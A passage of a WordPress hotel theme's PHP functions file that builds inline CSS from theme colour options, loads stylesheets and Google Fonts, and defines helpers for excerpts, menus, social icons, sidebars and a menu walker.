				.header-wrapper-2 .top-bar-wrapper .top-right-wrapper .language-menu p span, .header-wrapper-2 .top-bar-wrapper .top-right-wrapper .language-menu p a,
				.header-wrapper-3 .top-bar-wrapper .top-right-wrapper .language-menu p span, .header-wrapper-3 .top-bar-wrapper .top-right-wrapper .language-menu p a,
				.header-wrapper-4 .top-bar-wrapper .top-right-wrapper .language-menu p span, .header-wrapper-4 .top-bar-wrapper .top-right-wrapper .language-menu p a,
				.header-wrapper-1 .top-bar-wrapper a,
				.header-wrapper-2 .top-bar-wrapper a,
				.header-wrapper-3 .top-bar-wrapper a,
				.header-wrapper-4 .top-bar-wrapper a,
				.header-wrapper-1 .top-bar-wrapper .top-left-icons li.phone-icon:before,
				.header-wrapper-1 .top-bar-wrapper .top-left-icons li.map-icon:before,
				.header-wrapper-2 .top-bar-wrapper .top-left-icons li.phone-icon:before,
				.header-wrapper-2 .top-bar-wrapper .top-left-icons li.map-icon:before,
				.header-wrapper-3 .top-bar-wrapper .top-left-icons li.phone-icon:before,
				.header-wrapper-3 .top-bar-wrapper .top-left-icons li.map-icon:before,
				.header-wrapper-4 .top-bar-wrapper .top-left-icons li.phone-icon:before,
				.header-wrapper-4 .top-bar-wrapper .top-left-icons li.map-icon:before {color: ' . $sohohotel_data['header-top-bar-text-color'] . ';}';	
			}
			
			if( isset($sohohotel_data['header-top-bar-text-separator-color']) ) {
				$output .='.header-wrapper-1 .top-bar-wrapper .top-right-wrapper .language-menu ul li:after,
				.header-wrapper-2 .top-bar-wrapper .top-right-wrapper .language-menu ul li:after,
				.header-wrapper-3 .top-bar-wrapper .top-right-wrapper .language-menu ul li:after,
				.header-wrapper-4 .top-bar-wrapper .top-right-wrapper .language-menu ul li:after {color: ' . $sohohotel_data['header-top-bar-text-separator-color'] . ';}';
			}
			
			if( isset($sohohotel_data['header-top-right-button-background-color']) ) {
				$output .= '.header-wrapper-1 .top-right-button, 
				.header-wrapper-2 .top-right-button, 
				.header-wrapper-3 .top-right-button, 
				.header-wrapper-4 .top-right-button {background: ' . $sohohotel_data['header-top-right-button-background-color'] . ';}';
			}
			
			if( isset($sohohotel_data['header-top-right-button-text-color']) ) {
				$output .= '.header-wrapper-1 a.top-right-button, 
				.header-wrapper-2 a.top-right-button, 
				.header-wrapper-3 a.top-right-button, 
				.header-wrapper-4 a.top-right-button {color: ' . $sohohotel_data['header-top-right-button-text-color'] . ';}';
			}
			
			if( isset($sohohotel_data['footer-background-color']) ) {
				$output .= '.footer {background: ' . $sohohotel_data['footer-background-color'] . ';}';
			}
			
			if( isset($sohohotel_data['footer-text-color']) ) {
				$output .= '.footer,
				.footer h5,
				.footer a,
				.footer p,
				.footer p a,
				.footer li,
				.footer li a,
				.footer .contact-widget .cw-address:before,
				.footer .contact-widget .cw-phone:before,
				.footer .contact-widget .cw-cell:before {color: ' . $sohohotel_data['footer-text-color'] . ';}';
			}
			
			if( isset($sohohotel_data['footer-bottom-bar-background-color']) ) {
				$output .= '.footer-bottom {background: ' . $sohohotel_data['footer-bottom-bar-background-color'] . ';}';
			}
			
			if( isset($sohohotel_data['footer-bottom-bar-text-color']) ) {
				$output .= '.footer-bottom, .footer-bottom p, .footer-bottom a {color: ' . $sohohotel_data['footer-bottom-bar-text-color'] . ';}';
			}
		
			if( isset($sohohotel_data['booking-form-background-color']) ) {
				$output .= '.wide-booking-form,
				.booking-background-image .booking-background-image-inner .booking-form,
				.sidebar-booking-form .booking-form,
				.room-price-widget .from, .room-price-widget .price-detail {background: ' . $sohohotel_data['booking-form-background-color'] . ';}';
			}
			
			
			if( isset($sohohotel_data['booking-form-text-color']) ) {
				$output .= '.booking-form label, 
				.room-price-widget .price,
				.room-price-widget .from, .room-price-widget .price-detail {color: ' . $sohohotel_data['booking-form-text-color'] . ';}';
			}
			
			if( isset($sohohotel_data['booking-form-price-border-color']) ) {
				$output .= '.room-price-widget {border: 1px solid ' . $sohohotel_data['booking-form-price-border-color'] . ';}';
			}
			
			if( isset($sohohotel_data['booking-form-button-background-color']) ) {
				$output .= '.booking-form button {background: ' . $sohohotel_data['booking-form-button-background-color'] . ';}';
			}
			
			if( isset($sohohotel_data['booking-form-button-text-color']) ) {
				$output .= '.booking-form button {color: ' . $sohohotel_data['booking-form-button-text-color'] . ';}';
			}
			
			if ( !is_active_sidebar('footer-widget-area') ) {
				$output .= '.footer{padding: 0;}.footer-bottom{margin: 0;}';
			}
			
			if( isset($sohohotel_data['page-not-found']['url']) ) {
				$output .= '.page-not-found {
					background: url(" ' . $sohohotel_data['page-not-found']['url'] . ' ") top center no-repeat;
				}';
			}
			
			if( isset($sohohotel_data['booking-page-image']['url']) ) {
				$output .= '.booking-page-wrapper {
					background: url(" ' . $sohohotel_data['booking-page-image']['url'] . ' ") no-repeat fixed center top;
				}';
			}
			
			// Load Inline CSS
			wp_add_inline_style( 'sohohotel_style', $output );
			
			// Load Other CSS
			wp_enqueue_style('prettyPhoto', get_template_directory_uri() .'/framework/css/prettyPhoto.css');
			wp_enqueue_style('owlcarousel', get_template_directory_uri() .'/framework/css/owl.carousel.css');
			wp_enqueue_style('sohohotel_responsive', get_template_directory_uri() .'/framework/css/responsive.css');
			wp_enqueue_style('fontawesome', get_template_directory_uri() .'/framework/css/font-awesome/css/font-awesome.min.css');
			
		}
	}
}



/* ----------------------------------------------------------------------------

   Enqueue Fonts

---------------------------------------------------------------------------- */
function sohohotel_fonts_url() {
    $font_url = '';
    
    if ( 'off' !== _x( 'on', 'Google font: on or off', 'sohohotel' ) ) {
		
		global $sohohotel_data;
		
		if ( isset($sohohotel_data['google_font_url_1']) ) {
			$sohohotel_font_1 = esc_attr($sohohotel_data['google_font_url_1']);
		} else {
			$sohohotel_font_1 = 'Playfair+Display:400,400i,700,700i,900,900i';
		}
		
		if ( isset($sohohotel_data['google_font_url_2']) ) {
			$sohohotel_font_2 = esc_attr($sohohotel_data['google_font_url_2']);
		} else {
			$sohohotel_font_2 = 'Source Sans Pro:400,200,200italic,300,300italic,400italic,600,600italic,700,700italic,900,900italic';
		}
		
        $font_url = add_query_arg( 'family',$sohohotel_font_1 . '|' . $sohohotel_font_2, "//fonts.googleapis.com/css" );
    
	}

    return $font_url;

}

function sohohotel_font_scripts() {
    wp_enqueue_style( 'sohohotel_fonts', sohohotel_fonts_url(), array(), '1.0.0' );
}
add_action( 'wp_enqueue_scripts', 'sohohotel_font_scripts' );



/* ----------------------------------------------------------------------------

   Loads Files

---------------------------------------------------------------------------- */

// Post Types
include( get_template_directory() . '/framework/inc/post-types/page.php');
include( get_template_directory() . '/framework/inc/post-types/post.php');

// Widgets
include( get_template_directory() . '/framework/inc/widgets/widget-recent-posts.php');
include( get_template_directory() . '/framework/inc/widgets/widget-contact.php');
include( get_template_directory() . '/framework/inc/widgets/widget-booking.php');



/* ----------------------------------------------------------------------------

   Remove width / height attributes from gallery images

---------------------------------------------------------------------------- */
add_filter('wp_get_attachment_link', 'sohohotel_remove_img_width_height', 10, 1);
add_filter('wp_get_attachment_image_attributes', 'sohohotel_remove_img_width_height', 10, 1);

function sohohotel_remove_img_width_height($html) {
    $html = preg_replace( '/(width|height)=\"\d*\"\s/', "", $html );
    return $html;
}



/* ----------------------------------------------------------------------------

   Remove rel attribute from the category list

---------------------------------------------------------------------------- */
function sohohotel_remove_category_list_rel($output)
{
  $output = str_replace(' rel="category"', '', $output);
  return $output;
}
add_filter('wp_list_categories', 'sohohotel_remove_category_list_rel');
add_filter('the_category', 'sohohotel_remove_category_list_rel');



/* ----------------------------------------------------------------------------

   Excerpt Length

---------------------------------------------------------------------------- */
function sohohotel_print_excerpt($length) {
	global $post;
	$text = $post->post_excerpt;
	if ( '' == $text ) {
		$text = get_the_content('');
		$text = apply_filters('the_content', $text);
		$text = str_replace(']]>', ']]>', $text);
	}
	$text = strip_shortcodes($text); 
	$text = strip_tags($text);

	$text = substr($text,0,$length);
	$excerpt = sohohotel_reverse_strrchr($text, '.', 1);
	if( $excerpt ) {
		echo apply_filters('the_excerpt',$excerpt);
	} else {
		echo apply_filters('the_excerpt',$text);
	}
}

function sohohotel_reverse_strrchr($haystack, $needle, $trail) {
    return strrpos($haystack, $needle) ? substr($haystack, 0, strrpos($haystack, $needle) + $trail) : false;
}



/* ----------------------------------------------------------------------------

   Excerpt More Link

---------------------------------------------------------------------------- */
function sohohotel_continue_reading_link() {
		return '';
}

function sohohotel_auto_excerpt_more( $more ) {
	return sohohotel_continue_reading_link();
}
add_filter( 'excerpt_more', 'sohohotel_auto_excerpt_more' );



/* ----------------------------------------------------------------------------

   Main Menu Fallback

---------------------------------------------------------------------------- */
function sohohotel_main_menu_fallback() { ?>

<ul class="fallback_menu">
	<?php wp_list_pages(array(
		'depth' => 2,
		'exclude' => '',
		'title_li' => '',
		'link_before'  => '',
		'link_after'   => '',
		'sort_column' => 'post_title',
		'sort_order' => 'ASC',
	)); ?>
</ul>

<?php }



/* ----------------------------------------------------------------------------

   Mobile Main Menu Fallback

---------------------------------------------------------------------------- */
function sohohotel_mobile_menu() { ?>

<ul class="mobile-menu">
	<?php wp_list_pages(array(
		'depth' => 2,
		'exclude' => '',
		'title_li' => '',
		'link_before'  => '',
		'link_after'   => '',
		'sort_column' => 'post_title',
		'sort_order' => 'ASC',
	)); ?>
</ul>

<?php }



/* ----------------------------------------------------------------------------

   Password Protected Post Form

---------------------------------------------------------------------------- */
add_filter( 'the_password_form', 'sohohotel_password_form' );

function sohohotel_password_form() {
	
	global $post;
	$label = 'pwbox-'.( empty( $post->ID ) ? rand() : $post->ID );
	$form = '<div class="msg fail clearfix"><p class="nopassword">' . esc_html__( 'This post is password protected. To view it please enter your password below', 'sohohotel' ) . '</p></div>
<form class="protected-post-form" action="' . get_option('siteurl') . '/wp-login.php?action=postpass" method="post"><label for="' . esc_attr($label) . '">' . esc_html__( 'Password', 'sohohotel' ) . ' </label><input name="post_password" id="' . esc_attr($label) . '" class="text_input" type="password" size="20" /><div class="clearboth"></div><input class="button1" type="submit" value="' . esc_attr__( 'Submit','sohohotel' ) . '" name="submit"></form>';
	return $form;
	
}



/* ----------------------------------------------------------------------------

   Page Header

---------------------------------------------------------------------------- */
function sohohotel_page_header( $image_url ) {
	
	global $sohohotel_data;
	
	$output = '';
	
	if( is_single() || is_front_page() || is_archive() || is_search() ) {
		
		if ( !empty($sohohotel_data['page-header-image']['url'] ) ) {
			$output .= 'style="background:url(' . esc_url($sohohotel_data['page-header-image']['url']) . ') top center;"';
		}
	
	} else {
		
		if ( !empty($image_url) ) {
			$src = $image_url;
			$output .= 'style="background:url(' . esc_url( $src[0] ) . ') top center;"';
		} else {
			
			if ( !empty($sohohotel_data['page-header-image']['url']) ) {
				$output .= 'style="background:url(' . esc_url($sohohotel_data['page-header-image']['url']) . ') top center;"';
			}
			
		}
		
	}
	
	return $output;	
	
}



/* ----------------------------------------------------------------------------

   Add PrettyPhoto for Attached Images

---------------------------------------------------------------------------- */
add_filter( 'wp_get_attachment_link', 'sohohotel_sant_prettyadd');
function sohohotel_sant_prettyadd ($content) {
     $content = preg_replace("/<a/","<a
data-gal=\"prettyPhoto[slides]\"",$content,1);
     return $content;
}



/* ----------------------------------------------------------------------------

   Allow for plugin detection

---------------------------------------------------------------------------- */
include_once( ABSPATH . 'wp-admin/includes/plugin.php' );



/* ----------------------------------------------------------------------------

   Social Icons

---------------------------------------------------------------------------- */
function sohohotel_footer_social_icons() {
	
	global $sohohotel_data;
	
	$output = '';
	
	if($sohohotel_data['social-link-target'] == '1' ) {	
		$social_link_target = "_blank";
	} else {
		$social_link_target = "_parent";
	}
	
	if($sohohotel_data['facebook-icon'] != '' ) {	
		$output .= '<a target="' . $social_link_target . '" href="' . esc_url($sohohotel_data['facebook-icon']) . '"><i class="fa fa-facebook"></i></a>';		
	}
	
	if($sohohotel_data['flickr-icon'] != '' ) {	
		$output .= '<a target="' . $social_link_target . '" href="' . esc_url($sohohotel_data['flickr-icon']) . '"><i class="fa fa-flickr"></i></a>';		
	}
	
	if($sohohotel_data['googleplus-icon'] != '' ) {	
		$output .= '<a target="' . $social_link_target . '" href="' . esc_url($sohohotel_data['googleplus-icon']) . '"><i class="fa fa-google-plus"></i></a>';		
	}
	
	if($sohohotel_data['instagram-icon'] != '' ) {	
		$output .= '<a target="' . $social_link_target . '" href="' . esc_url($sohohotel_data['instagram-icon']) . '"><i class="fa fa-instagram"></i></a>';		
	}
	
	if($sohohotel_data['pinterest-icon'] != '' ) {	
		$output .= '<a target="' . $social_link_target . '" href="' . esc_url($sohohotel_data['pinterest-icon']) . '"><i class="fa fa-pinterest"></i></a>';		
	}
	
	if($sohohotel_data['skype-icon'] != '' ) {	
		$output .= '<a target="' . $social_link_target . '" href="' . esc_url($sohohotel_data['skype-icon']) . '"><i class="fa fa-skype"></i></a>';		
	}
	
	if($sohohotel_data['soundcloud-icon'] != '' ) {	
		$output .= '<a target="' . $social_link_target . '" href="' . esc_url($sohohotel_data['soundcloud-icon']) . '"><i class="fa fa-soundcloud"></i></a>';		
	}
	
	if($sohohotel_data['tumblr-icon'] != '' ) {	
		$output .= '<a target="' . $social_link_target . '" href="' . esc_url($sohohotel_data['tumblr-icon']) . '"><i class="fa fa-tumblr"></i></a>';		
	}
	
	if($sohohotel_data['twitter-icon'] != '' ) {	
		$output .= '<a target="' . $social_link_target . '" href="' . esc_url($sohohotel_data['twitter-icon']) . '"><i class="fa fa-twitter"></i></a>';		
	}
	
	if($sohohotel_data['vimeo-icon'] != '' ) {	
		$output .= '<a target="' . $social_link_target . '" href="' . esc_url($sohohotel_data['vimeo-icon']) . '"><i class="fa fa-vimeo-square"></i></a>';		
	}
	
	if($sohohotel_data['vine-icon'] != '' ) {	
		$output .= '<a target="' . $social_link_target . '" href="' . esc_url($sohohotel_data['vine-icon']) . '"><i class="fa fa-vine"></i></a>';		
	}
	
	if($sohohotel_data['yelp-icon'] != '' ) {	
		$output .= '<a target="' . $social_link_target . '" href="' . esc_url($sohohotel_data['yelp-icon']) . '"><i class="fa fa-yelp"></i></a>';		
	}
	
	if($sohohotel_data['youtube-icon'] != '' ) {	
		$output .= '<a target="' . $social_link_target . '" href="' . esc_url($sohohotel_data['youtube-icon']) . '"><i class="fa fa-youtube-play"></i></a>';		
	}
	
	if ( $sohohotel_data['facebook-icon'] == '' && $sohohotel_data['flickr-icon'] == '' && $sohohotel_data['googleplus-icon'] == '' && $sohohotel_data['instagram-icon'] == '' && $sohohotel_data['pinterest-icon'] == '' && $sohohotel_data['skype-icon'] == '' && $sohohotel_data['soundcloud-icon'] == '' && $sohohotel_data['tumblr-icon'] == '' && $sohohotel_data['twitter-icon'] == '' && $sohohotel_data['vimeo-icon'] == '' && $sohohotel_data['vine-icon'] == '' && $sohohotel_data['yelp-icon'] == '' && $sohohotel_data['youtube-icon'] == '' ) {
		return '';
	} else {
		return '<div class="footer-social-icons-wrapper">' . $output . '</div>';
	}
	
}



/* ----------------------------------------------------------------------------

   Social Icons Check

---------------------------------------------------------------------------- */
function sohohotel_footer_social_icons_check() {
	
	global $sohohotel_data;
	
	if ( $sohohotel_data['facebook-icon'] == '' && $sohohotel_data['flickr-icon'] == '' && $sohohotel_data['googleplus-icon'] == '' && $sohohotel_data['instagram-icon'] == '' && $sohohotel_data['pinterest-icon'] == '' && $sohohotel_data['skype-icon'] == '' && $sohohotel_data['soundcloud-icon'] == '' && $sohohotel_data['tumblr-icon'] == '' && $sohohotel_data['twitter-icon'] == '' && $sohohotel_data['vimeo-icon'] == '' && $sohohotel_data['vine-icon'] == '' && $sohohotel_data['yelp-icon'] == '' && $sohohotel_data['youtube-icon'] == '' ) {
		return 'false';
	}
	
}



/* ----------------------------------------------------------------------------

   Remove width/height dimensions from <img> tags

---------------------------------------------------------------------------- */
add_filter( 'post_thumbnail_html', 'sohohotel_remove_thumbnail_dimensions', 10 );
add_filter( 'image_send_to_editor', 'sohohotel_remove_thumbnail_dimensions', 10 );

function sohohotel_remove_thumbnail_dimensions( $html ) {
    $html = preg_replace( '/(width|height)=\"\d*\"\s/', "", $html );
    return $html;
}



/* ----------------------------------------------------------------------------

   Include Breadcrumbs

---------------------------------------------------------------------------- */
require_once( get_template_directory() . '/framework/inc/dimox_breadcrumbs.php');


/* ----------------------------------------------------------------------------

   Sidebar

---------------------------------------------------------------------------- */
function sohohotel_sidebar1($sidebar) {
	
	if ( $sidebar == 'left-sidebar' ) {
		$sohohotel_sidebar = 'main-content main-content-left-sidebar';
	} elseif ( $sidebar == 'right-sidebar' ) {
		$sohohotel_sidebar = 'main-content';
	} elseif ( $sidebar == 'full-width' ) {
		$sohohotel_sidebar = 'main-content main-content-full';
	} elseif ( $sidebar == 'booking-system' ) {
		$sohohotel_sidebar = 'main-content main-content-unboxed';
	} elseif ( $sidebar == 'unboxed-full-width' ) {
		$sohohotel_sidebar = 'main-content main-content-unboxed';
	} 
	
	else {
		$sohohotel_sidebar = 'main-content';
	}
	
	return $sohohotel_sidebar;
	
}

function sohohotel_sidebar2($sidebar) {
	
	if ( $sidebar == 'left-sidebar' ) {
		$sohohotel_sidebar = 'sidebar-content sidebar-content-left-sidebar';
	} elseif ( $sidebar == 'right-sidebar' ) {
		$sohohotel_sidebar = 'sidebar-content';
	} elseif ( $sidebar == 'full-width' ) {
		$sohohotel_sidebar = 'columns-full-width';
	} else {
		$sohohotel_sidebar = 'sidebar-content';
	}
	
	return $sohohotel_sidebar;
	
}



/* ----------------------------------------------------------------------------

   Allowed HTML

---------------------------------------------------------------------------- */
$sohohotel_allowed_html_array = array(
    'style' => array(),
	'div' => array(
		'class' => array(),
		'id' => array(),
	),
	'span' => array(
		'class' => array(),
		'id' => array(),
	),
	'a' => array(
	        'href' => array(),
	        'title' => array()
	),
	'h1' => array(
	        'class' => array(),
	        'id' => array()
	),
	'h2' => array(
	        'class' => array(),
	        'id' => array()
	),
	'h3' => array(
	        'class' => array(),
	        'id' => array()
	),
	'h4' => array(
	        'class' => array(),
	        'id' => array()
	),
	'h5' => array(
	        'class' => array(),
	        'id' => array()
	),
	'h6' => array(
	        'class' => array(),
	        'id' => array()
	),
	'i' => array(
	        'class' => array(),
	        'id' => array()
	),
	'p' => array(
	        'class' => array(),
	        'id' => array()
	),
);

global $sohohotel_allowed_html_array;




$sohohotel_allowed_html_array_header = array(
    'style' => array(),
	'div' => array(
		'class' => array(),
		'id' => array(),
	)
);

global $sohohotel_allowed_html_array_header;



/* ----------------------------------------------------------------------------

   Post Type Names

---------------------------------------------------------------------------- */
function sohohotel_post_type_name($post_type) {
	
	if ($post_type == 'post') {
		return esc_html__('Post','sohohotel');
	}
	
	if ($post_type == 'testimonial') {
		return esc_html__('Testimonial','sohohotel');
	}
	
	if ($post_type == 'page') {
		return esc_html__('Page','sohohotel');
	}
	
	if ($post_type == 'fleet') {
		return esc_html__('Vehicle','sohohotel');
	}
	
}



/* ----------------------------------------------------------------------------

   Limit Text

---------------------------------------------------------------------------- */
function sohohotel_limit_text($text, $limit) {
	
	if (str_word_count($text, 0) > $limit) {
		$words = str_word_count($text, 2);
		$pos = array_keys($words);
		$text = substr($text, 0, $pos[$limit]);
	}
	
	return $text;

}



/* ----------------------------------------------------------------------------

   Add Description Field to Menu

---------------------------------------------------------------------------- */
class description_walker extends Walker_Nav_Menu {
	function start_el(&$output, $item, $depth = 0, $args = array(), $id = 0)
      {
           global $wp_query;
           $indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';

           $class_names = $value = '';

           $classes = empty( $item->classes ) ? array() : (array) $item->classes;

           $class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item ) );
           $class_names = ' class="'. esc_attr( $class_names ) . ' menu-item-' . $item->ID . '"';

           $output .= $indent . '<li ' . $value . $class_names . '>';

           $attributes  = ! empty( $item->attr_title ) ? ' title="'  . esc_attr( $item->attr_title ) .'"' : '';
           $attributes .= ! empty( $item->target )     ? ' target="' . esc_attr( $item->target     ) .'"' : '';
           $attributes .= ! empty( $item->xfn )        ? ' rel="'    . esc_attr( $item->xfn        ) .'"' : '';
           $attributes .= ! empty( $item->url )        ? ' href="'   . esc_attr( $item->url        ) .'"' : '';

           $prepend = '<strong>';
           $append = '</strong>';
           $description  = ! empty( $item->description ) ? '<span>'.esc_attr( $item->description ).'</span>' : '';

           if($depth != 0) {
				$description = $append = $prepend = "";
           }

            $item_output = $args->before;
            $item_output .= '<a'. $attributes .'>';
            $item_output .= $args->link_before .$prepend.apply_filters( 'the_title', $item->title, $item->ID );
            $item_output .= $description.$args->link_after;
			$item_output .= $append;
            $item_output .= '</a>';
            $item_output .= $args->after;

            $output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );
		}
}



/* ----------------------------------------------------------------------------

   Apply theme's stylesheet to the visual editor

---------------------------------------------------------------------------- */
/*add_action( 'init', 'sohohotel_add_editor_styles' );

function sohohotel_add_editor_styles() {
	add_editor_style( get_stylesheet_uri() );
}*/